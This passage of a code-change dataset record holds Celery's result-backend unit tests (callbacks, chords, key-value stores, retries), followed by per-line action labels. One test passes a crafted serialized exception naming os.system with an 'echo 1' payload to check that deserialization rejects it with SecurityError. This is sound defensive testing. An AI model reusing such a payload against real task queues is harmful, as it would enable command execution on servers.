            "        request.delivery_info = {}",
            "        request.errbacks = [",
            "            self.bound_errback.subtask(args=[1], immutable=True)]",
            "        exc = KeyError()",
            "        group = self.patching('celery.backends.base.group')",
            "        b.mark_as_failure('id', exc, request=request)",
            "        group.assert_called_with(request.errbacks, app=self.app)",
            "        group.return_value.apply_async.assert_called_with(",
            "            (request.id, ), parent_id=request.id, root_id=request.root_id)",
            "",
            "    def test_mark_as_failure__errback(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.errbacks = [self.errback.subtask(args=[2, 3], immutable=True)]",
            "        exc = KeyError()",
            "        b.mark_as_failure('id', exc, request=request)",
            "        assert self.errback.last_result == 5",
            "",
            "    @patch('celery.backends.base.group')",
            "    def test_class_based_task_can_be_used_as_error_callback(self, mock_group):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "",
            "        class TaskBasedClass(Task):",
            "            def run(self):",
            "                pass",
            "",
            "        TaskBasedClass = self.app.register_task(TaskBasedClass())",
            "",
            "        request = Mock(name='request')",
            "        request.errbacks = [TaskBasedClass.subtask(args=[], immutable=True)]",
            "        exc = KeyError()",
            "        b.mark_as_failure('id', exc, request=request)",
            "        mock_group.assert_called_once_with(request.errbacks, app=self.app)",
            "",
            "    @patch('celery.backends.base.group')",
            "    def test_unregistered_task_can_be_used_as_error_callback(self, mock_group):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "",
            "        request = Mock(name='request')",
            "        request.errbacks = [signature('doesnotexist',",
            "                                      immutable=True)]",
            "        exc = KeyError()",
            "        b.mark_as_failure('id', exc, request=request)",
            "        mock_group.assert_called_once_with(request.errbacks, app=self.app)",
            "",
            "    def test_mark_as_failure__chord(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.errbacks = []",
            "        b.on_chord_part_return = Mock()",
            "        exc = KeyError()",
            "        b.mark_as_failure('id', exc, request=request)",
            "        b.on_chord_part_return.assert_called_with(request, states.FAILURE, exc)",
            "",
            "    def test_mark_as_revoked__chord(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.errbacks = []",
            "        b.on_chord_part_return = Mock()",
            "        b.mark_as_revoked('id', 'revoked', request=request)",
            "        b.on_chord_part_return.assert_called_with(request, states.REVOKED, ANY)",
            "",
            "    def test_chord_error_from_stack_raises(self):",
            "        class ExpectedException(Exception):",
            "            pass",
            "",
            "        b = BaseBackend(app=self.app)",
            "        callback = MagicMock(name='callback')",
            "        callback.options = {'link_error': []}",
            "        callback.keys.return_value = []",
            "        task = self.app.tasks[callback.task] = Mock()",
            "        b.fail_from_current_stack = Mock()",
            "        self.patching('celery.group')",
            "        with patch.object(",
            "            b, \"_call_task_errbacks\", side_effect=ExpectedException()",
            "        ) as mock_call_errbacks:",
            "            b.chord_error_from_stack(callback, exc=ValueError())",
            "        task.backend.fail_from_current_stack.assert_called_with(",
            "            callback.id, exc=mock_call_errbacks.side_effect,",
            "        )",
            "",
            "    def test_exception_to_python_when_None(self):",
            "        b = BaseBackend(app=self.app)",
            "        assert b.exception_to_python(None) is None",
            "",
            "    def test_not_an_actual_exc_info(self):",
            "        pass",
            "",
            "    def test_not_an_exception_but_a_callable(self):",
            "        x = {",
            "            'exc_message': ('echo 1',),",
            "            'exc_type': 'system',",
            "            'exc_module': 'os'",
            "        }",
            "",
            "        with pytest.raises(SecurityError,",
            "                           match=re.escape(r\"Expected an exception class, got os.system with payload ('echo 1',)\")):",
            "            self.b.exception_to_python(x)",
            "",
            "    def test_not_an_exception_but_another_object(self):",
            "        x = {",
            "            'exc_message': (),",
            "            'exc_type': 'object',",
            "            'exc_module': 'builtins'",
            "        }",
            "",
            "        with pytest.raises(SecurityError,",
            "                           match=re.escape(r\"Expected an exception class, got builtins.object with payload ()\")):",
            "            self.b.exception_to_python(x)",
            "",
            "    def test_exception_to_python_when_attribute_exception(self):",
            "        b = BaseBackend(app=self.app)",
            "        test_exception = {'exc_type': 'AttributeDoesNotExist',",
            "                          'exc_module': 'celery',",
            "                          'exc_message': ['Raise Custom Message']}",
            "",
            "        result_exc = b.exception_to_python(test_exception)",
            "        assert str(result_exc) == 'Raise Custom Message'",
            "",
            "    def test_exception_to_python_when_type_error(self):",
            "        b = BaseBackend(app=self.app)",
            "        celery.TestParamException = paramexception",
            "        test_exception = {'exc_type': 'TestParamException',",
            "                          'exc_module': 'celery',",
            "                          'exc_message': []}",
            "",
            "        result_exc = b.exception_to_python(test_exception)",
            "        del celery.TestParamException",
            "        assert str(result_exc) == \"<class 't.unit.backends.test_base.paramexception'>([])\"",
            "",
            "    def test_wait_for__on_interval(self):",
            "        self.patching('time.sleep')",
            "        b = BaseBackend(app=self.app)",
            "        b._get_task_meta_for = Mock()",
            "        b._get_task_meta_for.return_value = {'status': states.PENDING}",
            "        callback = Mock(name='callback')",
            "        with pytest.raises(TimeoutError):",
            "            b.wait_for(task_id='1', on_interval=callback, timeout=1)",
            "        callback.assert_called_with()",
            "",
            "        b._get_task_meta_for.return_value = {'status': states.SUCCESS}",
            "        b.wait_for(task_id='1', timeout=None)",
            "",
            "    def test_get_children(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._get_task_meta_for = Mock()",
            "        b._get_task_meta_for.return_value = {}",
            "        assert b.get_children('id') is None",
            "        b._get_task_meta_for.return_value = {'children': 3}",
            "        assert b.get_children('id') == 3",
            "",
            "",
            "class test_KeyValueStoreBackend:",
            "",
            "    def setup(self):",
            "        self.b = KVBackend(app=self.app)",
            "",
            "    def test_on_chord_part_return(self):",
            "        assert not self.b.implements_incr",
            "        self.b.on_chord_part_return(None, None, None)",
            "",
            "    def test_get_store_delete_result(self):",
            "        tid = uuid()",
            "        self.b.mark_as_done(tid, 'Hello world')",
            "        assert self.b.get_result(tid) == 'Hello world'",
            "        assert self.b.get_state(tid) == states.SUCCESS",
            "        self.b.forget(tid)",
            "        assert self.b.get_state(tid) == states.PENDING",
            "",
            "    @pytest.mark.parametrize('serializer',",
            "                             ['json', 'pickle', 'yaml', 'msgpack'])",
            "    def test_store_result_parent_id(self, serializer):",
            "        self.app.conf.accept_content = ('json', serializer)",
            "        self.b = KVBackend(app=self.app, serializer=serializer)",
            "        tid = uuid()",
            "        pid = uuid()",
            "        state = 'SUCCESS'",
            "        result = 10",
            "        request = Context(parent_id=pid)",
            "        self.b.store_result(",
            "            tid, state=state, result=result, request=request,",
            "        )",
            "        stored_meta = self.b.decode(self.b.get(self.b.get_key_for_task(tid)))",
            "        assert stored_meta['parent_id'] == request.parent_id",
            "",
            "    def test_store_result_group_id(self):",
            "        tid = uuid()",
            "        state = 'SUCCESS'",
            "        result = 10",
            "        request = Context(group='gid', children=[])",
            "        self.b.store_result(",
            "            tid, state=state, result=result, request=request,",
            "        )",
            "        stored_meta = self.b.decode(self.b.get(self.b.get_key_for_task(tid)))",
            "        assert stored_meta['group_id'] == request.group",
            "",
            "    def test_store_result_race_second_write_should_ignore_if_previous_success(self):",
            "        tid = uuid()",
            "        state = 'SUCCESS'",
            "        result = 10",
            "        request = Context(group='gid', children=[])",
            "        self.b.store_result(",
            "            tid, state=state, result=result, request=request,",
            "        )",
            "        self.b.store_result(",
            "            tid, state=states.FAILURE, result=result, request=request,",
            "        )",
            "        stored_meta = self.b.decode(self.b.get(self.b.get_key_for_task(tid)))",
            "        assert stored_meta['status'] == states.SUCCESS",
            "",
            "    def test_strip_prefix(self):",
            "        x = self.b.get_key_for_task('x1b34')",
            "        assert self.b._strip_prefix(x) == 'x1b34'",
            "        assert self.b._strip_prefix('x1b34') == 'x1b34'",
            "",
            "    def test_get_many(self):",
            "        for is_dict in True, False:",
            "            self.b.mget_returns_dict = is_dict",
            "            ids = {uuid(): i for i in range(10)}",
            "            for id, i in ids.items():",
            "                self.b.mark_as_done(id, i)",
            "            it = self.b.get_many(list(ids), interval=0.01)",
            "            for i, (got_id, got_state) in enumerate(it):",
            "                assert got_state['result'] == ids[got_id]",
            "            assert i == 9",
            "            assert list(self.b.get_many(list(ids), interval=0.01))",
            "",
            "            self.b._cache.clear()",
            "            callback = Mock(name='callback')",
            "            it = self.b.get_many(",
            "                list(ids),",
            "                on_message=callback,",
            "                interval=0.05",
            "            )",
            "            for i, (got_id, got_state) in enumerate(it):",
            "                assert got_state['result'] == ids[got_id]",
            "            assert i == 9",
            "            assert list(",
            "                self.b.get_many(list(ids), interval=0.01)",
            "            )",
            "            callback.assert_has_calls([",
            "                call(ANY) for id in ids",
            "            ])",
            "",
            "    def test_get_many_times_out(self):",
            "        tasks = [uuid() for _ in range(4)]",
            "        self.b._cache[tasks[1]] = {'status': 'PENDING'}",
            "        with pytest.raises(self.b.TimeoutError):",
            "            list(self.b.get_many(tasks, timeout=0.01, interval=0.01))",
            "",
            "    def test_get_many_passes_ready_states(self):",
            "        tasks_length = 10",
            "        ready_states = frozenset({states.SUCCESS})",
            "",
            "        self.b._cache.clear()",
            "        ids = {uuid(): i for i in range(tasks_length)}",
            "        for id, i in ids.items():",
            "            if i % 2 == 0:",
            "                self.b.mark_as_done(id, i)",
            "            else:",
            "                self.b.mark_as_failure(id, Exception())",
            "",
            "        it = self.b.get_many(list(ids), interval=0.01, max_iterations=1, READY_STATES=ready_states)",
            "        it_list = list(it)",
            "",
            "        assert all([got_state['status'] in ready_states for (got_id, got_state) in it_list])",
            "        assert len(it_list) == tasks_length / 2",
            "",
            "    def test_chord_part_return_no_gid(self):",
            "        self.b.implements_incr = True",
            "        task = Mock()",
            "        state = 'SUCCESS'",
            "        result = 10",
            "        task.request.group = None",
            "        self.b.get_key_for_chord = Mock()",
            "        self.b.get_key_for_chord.side_effect = AssertionError(",
            "            'should not get here',",
            "        )",
            "        assert self.b.on_chord_part_return(",
            "            task.request, state, result) is None",
            "",
            "    @patch('celery.backends.base.GroupResult')",
            "    @patch('celery.backends.base.maybe_signature')",
            "    def test_chord_part_return_restore_raises(self, maybe_signature,",
            "                                              GroupResult):",
            "        self.b.implements_incr = True",
            "        GroupResult.restore.side_effect = KeyError()",
            "        self.b.chord_error_from_stack = Mock()",
            "        callback = Mock(name='callback')",
            "        request = Mock(name='request')",
            "        request.group = 'gid'",
            "        maybe_signature.return_value = callback",
            "        self.b.on_chord_part_return(request, states.SUCCESS, 10)",
            "        self.b.chord_error_from_stack.assert_called_with(",
            "            callback, ANY,",
            "        )",
            "",
            "    @patch('celery.backends.base.GroupResult')",
            "    @patch('celery.backends.base.maybe_signature')",
            "    def test_chord_part_return_restore_empty(self, maybe_signature,",
            "                                             GroupResult):",
            "        self.b.implements_incr = True",
            "        GroupResult.restore.return_value = None",
            "        self.b.chord_error_from_stack = Mock()",
            "        callback = Mock(name='callback')",
            "        request = Mock(name='request')",
            "        request.group = 'gid'",
            "        maybe_signature.return_value = callback",
            "        self.b.on_chord_part_return(request, states.SUCCESS, 10)",
            "        self.b.chord_error_from_stack.assert_called_with(",
            "            callback, ANY,",
            "        )",
            "",
            "    def test_filter_ready(self):",
            "        self.b.decode_result = Mock()",
            "        self.b.decode_result.side_effect = pass1",
            "        assert len(list(self.b._filter_ready([",
            "            (1, {'status': states.RETRY}),",
            "            (2, {'status': states.FAILURE}),",
            "            (3, {'status': states.SUCCESS}),",
            "        ]))) == 2",
            "",
            "    @contextmanager",
            "    def _chord_part_context(self, b):",
            "",
            "        @self.app.task(shared=False)",
            "        def callback(result):",
            "            pass",
            "",
            "        b.implements_incr = True",
            "        b.client = Mock()",
            "        with patch('celery.backends.base.GroupResult') as GR:",
            "            deps = GR.restore.return_value = Mock(name='DEPS')",
            "            deps.__len__ = Mock()",
            "            deps.__len__.return_value = 10",
            "            b.incr = Mock()",
            "            b.incr.return_value = 10",
            "            b.expire = Mock()",
            "            task = Mock()",
            "            task.request.group = 'grid'",
            "            cb = task.request.chord = callback.s()",
            "            task.request.chord.freeze()",
            "            callback.backend = b",
            "            callback.backend.fail_from_current_stack = Mock()",
            "            yield task, deps, cb",
            "",
            "    def test_chord_part_return_timeout(self):",
            "        with self._chord_part_context(self.b) as (task, deps, _):",
            "            try:",
            "                self.app.conf.result_chord_join_timeout += 1.0",
            "                self.b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            finally:",
            "                self.app.conf.result_chord_join_timeout -= 1.0",
            "",
            "            self.b.expire.assert_not_called()",
            "            deps.delete.assert_called_with()",
            "            deps.join_native.assert_called_with(propagate=True, timeout=4.0)",
            "",
            "    def test_chord_part_return_propagate_set(self):",
            "        with self._chord_part_context(self.b) as (task, deps, _):",
            "            self.b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            self.b.expire.assert_not_called()",
            "            deps.delete.assert_called_with()",
            "            deps.join_native.assert_called_with(propagate=True, timeout=3.0)",
            "",
            "    def test_chord_part_return_propagate_default(self):",
            "        with self._chord_part_context(self.b) as (task, deps, _):",
            "            self.b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            self.b.expire.assert_not_called()",
            "            deps.delete.assert_called_with()",
            "            deps.join_native.assert_called_with(propagate=True, timeout=3.0)",
            "",
            "    def test_chord_part_return_join_raises_internal(self):",
            "        with self._chord_part_context(self.b) as (task, deps, callback):",
            "            deps._failed_join_report = lambda: iter([])",
            "            deps.join_native.side_effect = KeyError('foo')",
            "            self.b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            self.b.fail_from_current_stack.assert_called()",
            "            args = self.b.fail_from_current_stack.call_args",
            "            exc = args[1]['exc']",
            "            assert isinstance(exc, ChordError)",
            "            assert 'foo' in str(exc)",
            "",
            "    def test_chord_part_return_join_raises_task(self):",
            "        b = KVBackend(serializer='pickle', app=self.app)",
            "        with self._chord_part_context(b) as (task, deps, callback):",
            "            deps._failed_join_report = lambda: iter([",
            "                self.app.AsyncResult('culprit'),",
            "            ])",
            "            deps.join_native.side_effect = KeyError('foo')",
            "            b.on_chord_part_return(task.request, 'SUCCESS', 10)",
            "            b.fail_from_current_stack.assert_called()",
            "            args = b.fail_from_current_stack.call_args",
            "            exc = args[1]['exc']",
            "            assert isinstance(exc, ChordError)",
            "            assert 'Dependency culprit raised' in str(exc)",
            "",
            "    def test_restore_group_from_json(self):",
            "        b = KVBackend(serializer='json', app=self.app)",
            "        g = self.app.GroupResult(",
            "            'group_id',",
            "            [self.app.AsyncResult('a'), self.app.AsyncResult('b')],",
            "        )",
            "        b._save_group(g.id, g)",
            "        g2 = b._restore_group(g.id)['result']",
            "        assert g2 == g",
            "",
            "    def test_restore_group_from_pickle(self):",
            "        b = KVBackend(serializer='pickle', app=self.app)",
            "        g = self.app.GroupResult(",
            "            'group_id',",
            "            [self.app.AsyncResult('a'), self.app.AsyncResult('b')],",
            "        )",
            "        b._save_group(g.id, g)",
            "        g2 = b._restore_group(g.id)['result']",
            "        assert g2 == g",
            "",
            "    def test_chord_apply_fallback(self):",
            "        self.b.implements_incr = False",
            "        self.b.fallback_chord_unlock = Mock()",
            "        header_result_args = (",
            "            'group_id',",
            "            [self.app.AsyncResult(x) for x in range(3)],",
            "        )",
            "        self.b.apply_chord(",
            "            header_result_args, 'body', foo=1,",
            "        )",
            "        self.b.fallback_chord_unlock.assert_called_with(",
            "            self.app.GroupResult(*header_result_args), 'body', foo=1,",
            "        )",
            "",
            "    def test_get_missing_meta(self):",
            "        assert self.b.get_result('xxx-missing') is None",
            "        assert self.b.get_state('xxx-missing') == states.PENDING",
            "",
            "    def test_save_restore_delete_group(self):",
            "        tid = uuid()",
            "        tsr = self.app.GroupResult(",
            "            tid, [self.app.AsyncResult(uuid()) for _ in range(10)],",
            "        )",
            "        self.b.save_group(tid, tsr)",
            "        self.b.restore_group(tid)",
            "        assert self.b.restore_group(tid) == tsr",
            "        self.b.delete_group(tid)",
            "        assert self.b.restore_group(tid) is None",
            "",
            "    def test_restore_missing_group(self):",
            "        assert self.b.restore_group('xxx-nonexistant') is None",
            "",
            "",
            "class test_KeyValueStoreBackend_interface:",
            "",
            "    def test_get(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).get('a')",
            "",
            "    def test_set(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app)._set_with_state('a', 1, states.SUCCESS)",
            "",
            "    def test_incr(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).incr('a')",
            "",
            "    def test_cleanup(self):",
            "        assert not KeyValueStoreBackend(self.app).cleanup()",
            "",
            "    def test_delete(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).delete('a')",
            "",
            "    def test_mget(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).mget(['a'])",
            "",
            "    def test_forget(self):",
            "        with pytest.raises(NotImplementedError):",
            "            KeyValueStoreBackend(self.app).forget('a')",
            "",
            "",
            "class test_DisabledBackend:",
            "",
            "    def test_store_result(self):",
            "        DisabledBackend(self.app).store_result()",
            "",
            "    def test_is_disabled(self):",
            "        with pytest.raises(NotImplementedError):",
            "            DisabledBackend(self.app).get_state('foo')",
            "",
            "    def test_as_uri(self):",
            "        assert DisabledBackend(self.app).as_uri() == 'disabled://'",
            "",
            "    @pytest.mark.celery(result_backend='disabled')",
            "    def test_chord_raises_error(self):",
            "        with pytest.raises(NotImplementedError):",
            "            chord(self.add.s(i, i) for i in range(10))(self.add.s([2]))",
            "",
            "    @pytest.mark.celery(result_backend='disabled')",
            "    def test_chain_with_chord_raises_error(self):",
            "        with pytest.raises(NotImplementedError):",
            "            (self.add.s(2, 2) |",
            "             group(self.add.s(2, 2),",
            "                   self.add.s(5, 6)) | self.add.s()).delay()",
            "",
            "",
            "class test_as_uri:",
            "",
            "    def setup(self):",
            "        self.b = BaseBackend(",
            "            app=self.app,",
            "            url='sch://uuuu:pwpw@hostname.dom'",
            "        )",
            "",
            "    def test_as_uri_include_password(self):",
            "        assert self.b.as_uri(True) == self.b.url",
            "",
            "    def test_as_uri_exclude_password(self):",
            "        assert self.b.as_uri() == 'sch://uuuu:**@hostname.dom/'",
            "",
            "",
            "class test_backend_retries:",
            "",
            "    def test_should_retry_exception(self):",
            "        assert not BaseBackend(app=self.app).exception_safe_to_retry(Exception(\"test\"))",
            "",
            "    def test_get_failed_never_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = False, self.app.conf.result_backend_always_retry",
            "",
            "        expected_exc = Exception(\"failed\")",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.side_effect = [",
            "                expected_exc,",
            "                {'status': states.SUCCESS, 'result': 42}",
            "            ]",
            "            try:",
            "                b.get_task_meta(sentinel.task_id)",
            "                assert False",
            "            except Exception as exc:",
            "                assert b._sleep.call_count == 0",
            "                assert exc == expected_exc",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_get_with_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.side_effect = [",
            "                Exception(\"failed\"),",
            "                {'status': states.SUCCESS, 'result': 42}",
            "            ]",
            "            res = b.get_task_meta(sentinel.task_id)",
            "            assert res == {'status': states.SUCCESS, 'result': 42}",
            "            assert b._sleep.call_count == 1",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_get_reaching_max_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "        self.app.conf.result_backend_max_retries, prev_max_retries = 0, self.app.conf.result_backend_max_retries",
            "",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.side_effect = [",
            "                Exception(\"failed\"),",
            "                {'status': states.SUCCESS, 'result': 42}",
            "            ]",
            "            try:",
            "                b.get_task_meta(sentinel.task_id)",
            "                assert False",
            "            except BackendGetMetaError:",
            "                assert b._sleep.call_count == 0",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "            self.app.conf.result_backend_max_retries = prev_max_retries",
            "",
            "    def test_get_unsafe_exception(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "",
            "        expected_exc = Exception(\"failed\")",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.side_effect = [",
            "                expected_exc,",
            "                {'status': states.SUCCESS, 'result': 42}",
            "            ]",
            "            try:",
            "                b.get_task_meta(sentinel.task_id)",
            "                assert False",
            "            except Exception as exc:",
            "                assert b._sleep.call_count == 0",
            "                assert exc == expected_exc",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_store_result_never_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = False, self.app.conf.result_backend_always_retry",
            "",
            "        expected_exc = Exception(\"failed\")",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.return_value = {",
            "                'status': states.RETRY,",
            "                'result': {",
            "                    \"exc_type\": \"Exception\",",
            "                    \"exc_message\": [\"failed\"],",
            "                    \"exc_module\": \"builtins\",",
            "                },",
            "            }",
            "            b._store_result = Mock()",
            "            b._store_result.side_effect = [",
            "                expected_exc,",
            "                42",
            "            ]",
            "            try:",
            "                b.store_result(sentinel.task_id, 42, states.SUCCESS)",
            "            except Exception as exc:",
            "                assert b._sleep.call_count == 0",
            "                assert exc == expected_exc",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_store_result_with_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.return_value = {",
            "                'status': states.RETRY,",
            "                'result': {",
            "                    \"exc_type\": \"Exception\",",
            "                    \"exc_message\": [\"failed\"],",
            "                    \"exc_module\": \"builtins\",",
            "                },",
            "            }",
            "            b._store_result = Mock()",
            "            b._store_result.side_effect = [",
            "                Exception(\"failed\"),",
            "                42",
            "            ]",
            "            res = b.store_result(sentinel.task_id, 42, states.SUCCESS)",
            "            assert res == 42",
            "            assert b._sleep.call_count == 1",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "",
            "    def test_store_result_reaching_max_retries(self):",
            "        self.app.conf.result_backend_always_retry, prev = True, self.app.conf.result_backend_always_retry",
            "        self.app.conf.result_backend_max_retries, prev_max_retries = 0, self.app.conf.result_backend_max_retries",
            "",
            "        try:",
            "            b = BaseBackend(app=self.app)",
            "            b.exception_safe_to_retry = lambda exc: True",
            "            b._sleep = Mock()",
            "            b._get_task_meta_for = Mock()",
            "            b._get_task_meta_for.return_value = {",
            "                'status': states.RETRY,",
            "                'result': {",
            "                    \"exc_type\": \"Exception\",",
            "                    \"exc_message\": [\"failed\"],",
            "                    \"exc_module\": \"builtins\",",
            "                },",
            "            }",
            "            b._store_result = Mock()",
            "            b._store_result.side_effect = [",
            "                Exception(\"failed\"),",
            "                42",
            "            ]",
            "            try:",
            "                b.store_result(sentinel.task_id, 42, states.SUCCESS)",
            "                assert False",
            "            except BackendStoreError:",
            "                assert b._sleep.call_count == 0",
            "        finally:",
            "            self.app.conf.result_backend_always_retry = prev",
            "            self.app.conf.result_backend_max_retries = prev_max_retries"
        ],
        "action": [
            "-1",
            "0",
            "0",
            "0",
            "0",
            "0",
            "0",
            "2",
            "2",
            "0",
            "0",
            "0",
            "0",
            "0",
            "0",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "2",
            "0",
            "0",
            "0"
        ],
        "dele_reviseLocation": {
            "14": []
        },
        "addLocation": []
    }
}